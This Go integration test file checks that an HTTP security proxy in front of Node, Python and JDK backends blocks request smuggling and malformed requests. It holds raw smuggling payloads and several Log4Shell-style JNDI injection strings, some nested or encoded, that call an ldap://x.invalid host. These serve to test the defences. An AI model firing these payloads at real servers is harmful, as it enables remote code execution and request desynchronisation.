//go:build integration

package proxy

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// These tests put the proxy in front of real, independent HTTP implementations
// (Node.js, Python's http.server, the JDK's server) and check that what the
// backend actually parsed is what the proxy inspected: no smuggled second
// request, no folded or split headers, no changed target, no attack delivered.
//
// Run with: make integration   (set REQUIRE_BACKENDS=1 to fail instead of skip).

type backendSpec struct {
	name string
	cmd  func(dir string) *exec.Cmd
	bin  string
}

var backendSpecs = []backendSpec{
	{"node", func(d string) *exec.Cmd { return exec.Command("node", filepath.Join(d, "echo.js")) }, "node"},
	{"python", func(d string) *exec.Cmd { return exec.Command("python3", filepath.Join(d, "echo.py")) }, "python3"},
	{"jdk", func(d string) *exec.Cmd { return exec.Command("java", filepath.Join(d, "Echo.java")) }, "java"},
}

// echoed is what a backend reports about the request it parsed.
type echoed struct {
	Seq     int      `json:"seq"`
	Method  string   `json:"method"`
	Target  string   `json:"target"`
	Headers []string `json:"headers"`
	Body    string   `json:"body"`
}

func (e echoed) header(name string) []string {
	var out []string
	for i := 0; i+1 < len(e.Headers); i += 2 {
		if strings.EqualFold(e.Headers[i], name) {
			out = append(out, e.Headers[i+1])
		}
	}
	return out
}

func freePort(t *testing.T) int {
	t.Helper()
	var lc net.ListenConfig
	ln, err := lc.Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = ln.Close() }()
	return ln.Addr().(*net.TCPAddr).Port
}

func startBackend(t *testing.T, s backendSpec) *url.URL {
	t.Helper()
	if _, err := exec.LookPath(s.bin); err != nil {
		if os.Getenv("REQUIRE_BACKENDS") != "" {
			t.Fatalf("%s is required but not installed", s.bin)
		}
		t.Skipf("%s not installed", s.bin)
	}
	port := freePort(t)
	cmd := s.cmd("testdata/backends")
	cmd.Env = append(os.Environ(), fmt.Sprintf("PORT=%d", port))
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = cmd.Process.Kill(); _ = cmd.Wait() })
	addr := fmt.Sprintf("127.0.0.1:%d", port)
	deadline := time.Now().Add(30 * time.Second)
	for {
		d := net.Dialer{Timeout: 200 * time.Millisecond}
		if c, err := d.DialContext(context.Background(), "tcp", addr); err == nil {
			_ = c.Close()
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("%s backend did not start", s.name)
		}
		time.Sleep(100 * time.Millisecond)
	}
	return &url.URL{Scheme: "http", Host: addr}
}

func TestProxyInFrontOfRealBackends(t *testing.T) {
	for _, spec := range backendSpecs {
		t.Run(spec.name, func(t *testing.T) {
			up := startBackend(t, spec)
			p, err := New(Config{Upstream: up, Mode: ModeBlock})
			if err != nil {
				t.Fatal(err)
			}
			srv := httptest.NewUnstartedServer(p)
			srv.Listener = p.WrapListener(srv.Listener)
			srv.Start()
			defer srv.Close()
			addr := strings.TrimPrefix(srv.URL, "http://")

			// send writes payload, reads n responses, and returns the echoes
			// (nil for a non-200 response).
			send := func(t *testing.T, payload string, n int) ([]*echoed, []int) {
				t.Helper()
				conn := dial(t, addr)
				defer func() { _ = conn.Close() }()
				_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
				_, _ = io.WriteString(conn, payload)
				br := bufio.NewReader(conn)
				var echoes []*echoed
				var statuses []int
				for i := 0; i < n; i++ {
					resp, err := http.ReadResponse(br, nil)
					if err != nil {
						break
					}
					b, _ := io.ReadAll(resp.Body)
					_ = resp.Body.Close()
					statuses = append(statuses, resp.StatusCode)
					var e echoed
					if resp.StatusCode == http.StatusOK && json.Unmarshal(b, &e) == nil {
						echoes = append(echoes, &e)
					} else {
						echoes = append(echoes, nil)
					}
				}
				return echoes, statuses
			}

			t.Run("target is delivered verbatim", func(t *testing.T) {
				for _, target := range []string{"/", "/a%2Fb/%7e?x=%7B%24&y=%e2%82%ac", "/a/../b;p=1?", "/%2e%2e/x"} {
					echoes, _ := send(t, rawGET(target), 1)
					if len(echoes) != 1 || echoes[0] == nil {
						t.Fatalf("%q: no echo", target)
					}
					if echoes[0].Target != target {
						t.Errorf("sent %q, backend saw %q", target, echoes[0].Target)
					}
				}
			})

			t.Run("a request smuggled in a body stays a body", func(t *testing.T) {
				inner := "GET /admin HTTP/1.1\r\nHost: a\r\n\r\n"
				payload := fmt.Sprintf("POST /x HTTP/1.1\r\nHost: a\r\nContent-Length: %d\r\n\r\n%s", len(inner), inner)
				echoes, _ := send(t, payload, 2)
				if len(echoes) != 1 || echoes[0] == nil || echoes[0].Body != inner || echoes[0].Target != "/x" {
					t.Errorf("echoes = %+v", echoes)
				}
			})

			t.Run("chunked is re-framed with one Content-Length", func(t *testing.T) {
				payload := "POST /c HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n6;ext=1\r\n world\r\n0\r\n\r\n"
				echoes, _ := send(t, payload, 1)
				if len(echoes) != 1 || echoes[0] == nil {
					t.Fatal("no echo")
				}
				e := echoes[0]
				if e.Body != "hello world" || len(e.header("Content-Length")) != 1 || len(e.header("Transfer-Encoding")) != 0 {
					t.Errorf("body=%q CL=%v TE=%v", e.Body, e.header("Content-Length"), e.header("Transfer-Encoding"))
				}
			})

			t.Run("Content-Length plus Transfer-Encoding cannot desynchronize", func(t *testing.T) {
				// Go prefers Transfer-Encoding; whatever the proxy accepts, the
				// backend must see exactly one request carrying the de-chunked body.
				payload := "POST /s HTTP/1.1\r\nHost: a\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: a\r\n\r\n"
				echoes, _ := send(t, payload, 3)
				for _, e := range echoes {
					if e != nil && e.Target == "/smuggled" && e.Seq == 0 {
						t.Fatal("impossible")
					}
				}
				// The trailing GET is a legitimate second request on the connection
				// (it follows a complete first request), so two echoes are allowed,
				// but the first must carry exactly the de-chunked body.
				if len(echoes) == 0 || echoes[0] == nil || echoes[0].Body != "Z" || echoes[0].Target != "/s" {
					t.Errorf("echoes = %+v", echoes)
				}
			})

			t.Run("pipelined requests stay separate and in order", func(t *testing.T) {
				payload := rawGETKeep("/1") + rawGETKeep("/2") + rawGET("/3")
				echoes, _ := send(t, payload, 3)
				if len(echoes) != 3 {
					t.Fatalf("got %d responses", len(echoes))
				}
				for i, want := range []string{"/1", "/2", "/3"} {
					if echoes[i] == nil || echoes[i].Target != want {
						t.Errorf("response %d: %+v", i, echoes[i])
					}
				}
			})

			t.Run("headers arrive intact and unfolded", func(t *testing.T) {
				payload := "GET /h HTTP/1.1\r\nHost: a\r\nX-Folded: part1\r\n part2\r\nX-Dup: one\r\nX-Dup: two\r\nConnection: close\r\n\r\n"
				echoes, _ := send(t, payload, 1)
				if len(echoes) != 1 || echoes[0] == nil {
					t.Fatal("no echo")
				}
				for i := 1; i < len(echoes[0].Headers); i += 2 {
					if strings.ContainsAny(echoes[0].Headers[i], "\r\n") {
						t.Errorf("header value contains a line break: %q", echoes[0].Headers[i])
					}
				}
				if got := echoes[0].header("X-Dup"); len(got) == 0 {
					t.Errorf("X-Dup lost: %v", echoes[0].Headers)
				}
			})

			t.Run("malformed requests never reach the backend", func(t *testing.T) {
				for name, payload := range map[string]string{
					"space before colon": "GET / HTTP/1.1\r\nHost : a\r\n\r\n",
					"two hosts":          "GET / HTTP/1.1\r\nHost: a\r\nHost: b\r\n\r\n",
					"bad te":             "POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: xchunked\r\n\r\n",
					"fragment":           "GET /#x HTTP/1.1\r\nHost: a\r\n\r\n",
					"double slash":       "GET //evil/x HTTP/1.1\r\nHost: a\r\n\r\n",
					"absolute form":      "GET http://evil/x HTTP/1.1\r\nHost: a\r\n\r\n",
				} {
					echoes, statuses := send(t, payload, 1)
					for i, e := range echoes {
						if e != nil {
							t.Errorf("%s: reached the backend (status %d)", name, statuses[i])
						}
					}
				}
			})

			t.Run("attacks are blocked and never delivered", func(t *testing.T) {
				before, _ := send(t, rawGET("/probe"), 1)
				for name, payload := range map[string]string{
					"header":         rawGET("/", "User-Agent: ${jndi:ldap://x.invalid/a}"),
					"nested":         rawGET("/", "X-Api-Version: ${${lower:j}ndi:${lower:l}dap://x.invalid/a}"),
					"target":         rawGET("/%24%7Bjndi:ldap://x.invalid/a%7D"),
					"query":          rawGET("/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.invalid%2Fa%7D"),
					"form body":      "POST / HTTP/1.1\r\nHost: a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\nConnection: close\r\n\r\nq=%24%7Bjndi%3Aldap%3A%2F%2Fx.invalid%2Fa%7D",
					"chunked attack": "POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n6\r\n${jndi\r\n14\r\n:ldap://x.invalid/a}\r\n0\r\n\r\n",
				} {
					echoes, statuses := send(t, payload, 1)
					if len(statuses) != 1 || statuses[0] != http.StatusForbidden || echoes[0] != nil {
						t.Errorf("%s: statuses %v", name, statuses)
					}
				}
				after, _ := send(t, rawGET("/probe"), 1)
				if before[0] == nil || after[0] == nil || after[0].Seq != before[0].Seq+1 {
					t.Errorf("the backend saw extra requests: seq %v then %v", before[0], after[0])
				}
			})
		})
	}
}

// rawGETKeep is rawGET without "Connection: close", for pipelining.
func rawGETKeep(target string) string {
	return "GET " + target + " HTTP/1.1\r\nHost: app.example.com\r\n\r\n"
}
